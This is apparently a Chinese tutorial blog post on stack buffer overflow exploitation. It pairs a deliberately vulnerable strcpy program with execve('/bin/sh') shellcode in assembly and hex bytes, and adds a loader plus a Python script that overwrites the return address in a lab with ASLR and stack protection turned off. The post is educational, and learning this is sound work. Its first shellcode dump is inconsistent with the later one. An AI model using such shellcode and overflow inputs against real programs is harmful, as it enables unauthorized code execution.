---
title: 缓冲区溢出的shellcode 攻击
url: https://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247488148&idx=1&sn=5357d7e087d5b15f366de611bfb2e1c2&chksm=fdf97981ca8ef097d230c7ab54bd8dc888d5efb16d0e8087fd6b6abbee4e61d035b24a6c1523&scene=58&subscene=0#rd
source: debugeeker
date: 2023-02-01
fetch_date: 2025-10-04T05:21:23.939454
---

# 缓冲区溢出的shellcode 攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/QXsgGBUcicbwafTZMxrGdJ0EX93ILiaw6zUl1YM0paMa4vNICdACOJfqfK5SSu8o0IUpPFuVnHYvZtibVMfH0Lnbw/0?wx_fmt=jpeg)

# 缓冲区溢出的shellcode 攻击

原创

debugeeker

奶牛安全

> 这个文章是内存马的原理
>
> 文章译自https://medium.com/@jain.sm/shell-code-exploit-with-buffer-overflow-8d78cc11f89b

继续上一篇文章[《栈上函数的生命周期》](http://mp.weixin.qq.com/s?__biz=MzU4NjY0NTExNA==&mid=2247486129&idx=1&sn=b81ba4b01404d789790ba274fd79f955&chksm=fdf961a4ca8ee8b25da1f1794ad87135fa6ac1c10dcacf716bba67c7d81874722e3d883983ea&scene=21#wechat_redirect)，这里解释一下如何利用堆栈上的缓冲区溢出的漏洞

这是一种利用漏洞来破坏内存并转移程序的正常执行流程。这基本上是通过控制`EIP`来实现的。

我们先从缓冲区溢出非常基本的理解开始。缓冲区溢出是程序编写者忘记对缓冲区大小进行有界检查的情况，这使得攻击者能够放入超过缓冲区所能容纳的数据。然后，这些数据会溢出到相邻的内存区。作为上一篇文章中解释的堆栈布局的一个示例，如果存在漏洞，则可以使缓冲区溢出写入到保存返回地址的内存单元。

看下面的例子：

```
void copyData (char* data)
{
 char buff[10];
 strcpy(buff,data);
}
int main (int argc, char *argv[])
{
 copyData(argv[1]);
 return 0;
}
```

函数`copyData`的参数是一个字符串，并调用`strcpy`把参数拷贝到一个缓冲区。

像上一篇文章讨论那样，对`copyData`的调用会进行如下操作：

1. 把返回地址压入栈中
2. 把`ebp`的值压入栈中（这时`ebp`的值指向`main`函数这一桢）
3. 在栈上分配10个字节的空间给局部变量

现在，如果我们尝试以覆盖栈上的返回地址方式进而改变`EIP`的方式溢出缓冲区，我们会得到一个`coredump`文件，里面会包含栈崩溃的消息。

![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbwiaOxtzyfSWlJLcTLz446RejL5gthzFPW2rHUZBlc39R71Zj9QthEHmetm3hsZtiaNb79QE7MPUlew/640?wx_fmt=png)

img

当`EIP`被垃圾字符填充，产生`coredump`时，就会发生这种情况。堆栈如下所示

![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbwiaOxtzyfSWlJLcTLz446ReVA2zVTzCNWfxIRAThh7osnFp5Bp3ZiaOyLa7gMoNlEGDLn1CpCETfnQ/640?wx_fmt=png)

img

对于这个例子，我们会关闭`ASLR`(地址空间布局随机化)，使用`gcc`的`-fno-stack-protector`编译选项和`-zexecstack`标志。这样做是为了展示利用漏洞。否则，堆栈、堆和数据段将成为不可执行的，因此不能从那里运行任何代码。此外，在启用`ASLR`的情况下，确定`shellcode`将在运行时加载的地址变得更加困难。

> 译者注：
>
> 二进制防护的手段主要是这样
>
> 1. 栈的安全cookie，主要是通过`-fstack-protector`
> 2. `SEH`(结构化异常处理)，`windows`机制，在栈上维护一个单链表，一旦检测到栈损坏，请调用相应的处理函数
> 3. `DEP`（防止数据段执行），有从硬件角度和软件角度实现，但系统也会提供接口来修改段属性。
> 4. `VEH`（向量异常处理），`windows`机制，一般用在堆上，防止堆损坏，而且处理优于`SEH`。`Linux`一直没有相应机制，导致堆块损坏的崩溃问题非常难定位
> 5. `ASLR`（地址空间布局随机化），同一程序每次启动一个进程，加载库的基地址都不一样，从而比较难预测。上面四种机制针对缓冲区溢出时`shellcode`在堆和栈上执行的问题，但无法防护`ROP`(面向返回地址编程)攻击手段，`ASLR`是针对`ROP`攻击的。

为了解释简单的`shellcode`，我们将用汇编语言编写一小段代码。

我们以执行系统调用编号59的汇编代码为例。系统调用号59是sys\_execve调用，并接受执行程序(在下面的示例中为`/bin/sh`)作为输入参数。

```
global _start
section .text
_start:
        xor rax, rax
        push rax
        mov rdx, rsp
        mov rbx, 0x68732f6e69622f2f
        push rbx
        mov rdi, rsp
        push rax
        push rdi
        mov rsi,rsp
        add rax, 59
        syscall
```

编译这段汇编来产生一个执行文件。

```
nasm -felf64 shell.asm -o shell.o
ld shell.o -o shell
```

从这里，我可以通过`objdump`工具来产生`shellcode`，这样做是为了删除可能被解释为空终止符的错误字符，如\x00。

```
objdump -M Intel -d ./shell |grep ‘[0–9a-f]:’|grep -v ‘file’|cut -f2 -d:|cut -f1–7 -d’ ‘|tr -s ‘ ‘|tr ‘\t’ ‘ ‘|sed ‘s/ $//g’|sed ‘s/ /\\x/g’|paste -d ‘’ -s |sed ‘s/^/”/’|sed ‘s/$/”/g’
```

`shellcode`产生如下

```
“\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00\x00\x00\x00\x00\x00\x00\xe6\x48\x83\xc0\x3b\x0f\x05”
```

这段`shellcode`会作为字符串被接下来的程序来加载。

我们现在写一段简单的`C`程序用来加载和执行`shellcode`。在这个例子下，函数`shell_pwn`加载和执行`shellcode`.这里我们展示如何通过指定输入来溢出函数`copytobuffer`函数的缓冲区。这个输入精心构造可以改变返回地址，使得它指向`shell_pwn`函数。

`flow.c`:

```
#include <string.h>
#include <stdlib.h>
void shell_pwn()
{
    const char code[] =
    “\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05”;
    //const char shellcode[] = “\x90”;
    ////printf(“Shellcode Length: %d\n”, (int)strlen(code));
    ////((void(*)(void))code)();
    int (*ret)() = (int(*)())code;
    ret();
    exit(0);
}
int copytobuffer(char* input)
{
    char buffer[15];
    strcpy (buffer,input);
    return 0;
}
void main (int argc, char *argv[])
{
    int local_variable = 1;
    copytobuffer(argv[1]);
    exit(0);
}
```

下面截图，我们会用`gdb`来确定`shell_pwn`函数的地址

![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbwiaOxtzyfSWlJLcTLz446Re7zJmFvicwA8yXdicvFwa1kd7OJuNUz7e0NoUeaibH2WdwESmDToBUfIQA/640?wx_fmt=png)

img

![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbwiaOxtzyfSWlJLcTLz446ReGTKiadKict7Sk7fGQyHboAwNR1bD7CibJlvn4Evu9ENqWAAQaPJ6nibXdA/640?wx_fmt=png)

img

我们可以看到`shell_pwn`函数的地址是`0x400566`。我们使用一个`python`程序产生输入来溢出缓冲区，并且让栈上的返回地址指向`shell_pwn`函数

```
#!/usr/bin/python
from struct import *
buffer = ''
buffer += 'a'*24
buffer += pack("<Q",0x0000000000400566)
f = open("input2.txt", "w")
f.write(buffer)
```

一旦完成，我们就可以看到，使用上面的输入执行了二进制流，就能够通过覆盖堆栈上的返回地址在程序内部执行shell。

![](https://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbwiaOxtzyfSWlJLcTLz446ReSxogxsCrlf7JoZKL3AdBusaaMKiaibSqgqd659I265GfKBmDJwd8j07w/640?wx_fmt=png)

img

在接下来的文章中，我们将看到更多的缓冲区溢出攻击，比如创建绑定外壳或反向外壳。我们还将查看是否可以使用`Metasploit`模块生成`shellcode`。

**暗号：51651**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbx6xrcgOW7u8WSYofSfx2y0VWAmzT5CR8RNMDIgmWTZbyepagBpxicbYUUcBrMzEHLpHRRB2bPJTeA/0?wx_fmt=png)

奶牛安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/QXsgGBUcicbx6xrcgOW7u8WSYofSfx2y0VWAmzT5CR8RNMDIgmWTZbyepagBpxicbYUUcBrMzEHLpHRRB2bPJTeA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过